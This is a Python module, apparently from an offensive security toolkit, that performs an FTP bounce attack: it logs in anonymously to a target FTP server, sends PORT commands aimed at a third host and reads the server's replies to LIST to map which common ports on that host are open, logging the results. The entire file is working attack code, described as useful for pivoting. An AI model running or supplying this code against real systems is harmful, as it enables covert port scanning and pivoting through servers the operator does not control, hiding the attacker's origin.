"""
FTP Bounce Attack — uses PORT command to make the FTP server
scan/connect to a third host, useful for pivoting.
"""
import ftplib
import socket
import struct
from Design.colors_cli import console
from modules.target import TargetInfo
from modules.attack_config import AttackConfig


COMMON_PORTS = [21, 22, 25, 80, 443, 445, 3306, 5432, 8080, 8443]


def _port_tuple(ip, port):
    octets = [int(x) for x in ip.split(".")]
    return (*octets, port // 256, port % 256)


def run(target: TargetInfo, config: AttackConfig) -> None:
    scan_host = config.ftp_bounce_host or target.host
    console.print(
        f"\n[bold primary][ FTP BOUNCE / BOUNCE PORT SCAN ][/bold primary]\n"
        f"  [muted]FTP server:[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [muted]Scanning  :[/muted] [text]{scan_host}[/text]\n"
    )

    try:
        ip = socket.gethostbyname(scan_host)
    except Exception as e:
        console.print(f"[error]  Cannot resolve {scan_host}: {e}[/error]")
        return

    ftp = ftplib.FTP()
    try:
        ftp.connect(target.host, target.port, timeout=8)
        try:
            ftp.login("anonymous", "test@test.com")
        except ftplib.error_perm:
            ftp.close()
            console.print("[error]  Anonymous login required for bounce attack.[/error]")
            return

        results = []
        for port in COMMON_PORTS:
            try:
                port_cmd = "PORT " + ",".join(str(x) for x in _port_tuple(ip, port))
                ftp.sendcmd(port_cmd)          # returns 200 PORT command successful
                try:
                    ftp.sendcmd("LIST")
                    status = "OPEN"
                except ftplib.error_temp as e:
                    msg = str(e)
                    if "425" in msg or "426" in msg or "150" in msg:
                        status = "OPEN"
                    elif "550" in msg or "551" in msg:
                        status = "CLOSED"
                    else:
                        status = "UNKNOWN"
                except ftplib.error_perm as e:
                    msg = str(e)
                    status = "OPEN" if "150" in msg else "CLOSED"
            except ftplib.error_perm:
                status = "BLOCKED"
            except Exception:
                status = "UNKNOWN"

            icon = "✓" if status == "OPEN" else "·"
            style = "success" if status == "OPEN" else "muted"
            console.print(f"  [{style}]{icon} {scan_host}:{port} — {status}[/{style}]")
            results.append((port, status))

        try: ftp.quit()
        except Exception: ftp.close()

        if config.log_file:
            try:
                with open(config.log_file, "a", encoding="utf-8") as fh:
                    for port, st in results:
                        fh.write(f"[FTP-BOUNCE] {target.host} → {scan_host}:{port} {st}\n")
            except OSError:
                pass

    except Exception as e:
        console.print(f"[error]  Bounce attack failed: {e}[/error]")